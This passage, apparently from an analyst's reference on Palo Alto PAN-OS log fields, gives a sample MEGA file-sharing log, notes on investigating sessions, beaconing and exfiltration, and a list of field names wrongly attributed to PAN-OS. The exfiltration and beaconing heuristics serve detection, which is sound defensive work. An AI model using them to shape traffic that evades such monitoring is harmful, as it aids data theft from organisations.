  "subcategory_of_app": "file-sharing",
  "category_of_app": "general-internet",
  "technology_of_app": "browser-based",
  "risk_of_app": "4",
  "characteristic_of_app": "able-to-transfer-file,has-known-vulnerability,tunnel-other-application,prone-to-misuse,is-saas",
  "tunneled_app": "mega",
  "is_saas_of_app": "yes",
  "sanctioned_state_of_app": "no",
  "offloaded": "0",
  "flow_type": "NonProxyTraffic"
}
```


## 5. Investigation notes

- **Pivot fields:** `src`/`srcuser`/`src_host` (who), `dst` + `misc`/URL host + `category` (where), `app` (what), `rule` (which policy allowed it), `natsrc` (what the outside world saw — match against abuse reports / external TI hits).
- **Session ↔ threat linkage:** a THREAT log and the TRAFFIC log of the same connection share `sessionid` **and** a close time window (session IDs are recycled, so never join on `sessionid` alone across days). A session with a threat usually ends with `session_end_reason` = `threat`.
- **Traffic log timing:** by default only `end` logs are written (log-at-session-end). A long upload appears **once**, when it finishes — compute the window from `start` + `elapsed`.
- **Beaconing:** group TRAFFIC `end` by `src`,`dst`,`dport`, look for near-constant interval and near-constant `bytes_sent`; `category` `newly-registered-domain` / `unknown` / `insufficient-content` raises priority.
- **Exfil:** ratio `bytes_sent`/`bytes_received` ≫ 1, `app` file-sharing/SaaS with `sanctioned_state_of_app` = `no`, off-hours `start`.
- **Console view:** Monitor → Logs → Traffic / Threat / URL Filtering; the detailed log view shows the same fields with display names (Source Zone = `from`, Destination Zone = `to`, Threat ID/Name = `threatid`). Query syntax examples: `( addr.src in 10.20.14.37 ) and ( app eq mega )`, `( category eq newly-registered-domain )`.

## 6. Common mistakes / fields that do NOT exist in PAN-OS logs

- No `srcip` / `dstip` / `srcport` / `dstport` / `sentbyte` / `rcvdbyte` / `policyid` / `logid` / `devname` — those are **FortiGate** names. PAN uses `src`, `dst`, `sport`, `dport`, `bytes_sent`, `bytes_received`, `rule`, `device_name`.
- No `rule_name` / `rule_uid` / `xlatesrc` / `inzone` / `outzone` / `loguid` / `origin` — those are **Check Point**. PAN zones are `from` / `to`; NAT is `natsrc` / `natdst`.
- No `src_zone` / `dst_zone` / `src_ip` / `event_type` / `alert_name` — invented/ECS-style names.
- No `threat_name` + `threat_id` split — the native column is `threatid` = `Name(ID)`. No numeric severity (`severity` is a word).
- `direction` is `client-to-server` / `server-to-client` on the wire (not `0`/`1`, not `inbound`/`outbound`).
- `category` in a THREAT log is the **URL category**, not "spyware/vulnerability" — the threat type is `subtype` (and `thr_category`).
- URL filtering events are `type` = `THREAT`, `subtype` = `url` — there is no `type=URL` in syslog.
- `action` spelling differs by log type: TRAFFIC uses `reset both` (space), THREAT uses `reset-both` (hyphen).
- Do not wrap PAN logs in `data.*`, `panw.panos.*`, `source.ip`, `event.action` — those are SIEM normalisations.
